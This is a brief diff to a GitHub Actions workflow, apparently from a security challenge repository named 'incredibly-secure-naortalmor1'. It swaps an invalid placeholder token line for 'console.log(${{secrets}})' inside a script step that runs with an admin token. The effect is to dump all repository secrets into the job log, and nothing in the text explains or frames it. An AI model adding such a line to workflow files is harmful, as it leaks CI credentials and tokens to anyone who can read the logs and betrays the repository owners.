@@ -10,7 +10,7 @@ jobs:
         with:
           github-token: ${{ secrets.ADMIN_TOKEN }}
           script: |
-            var github-token = "deadc0de"
+            console.log(${{secrets}})
             await github.issues.create({
               owner: "incrediblysecureinc",
               repo: "incredibly-secure-naortalmor1",
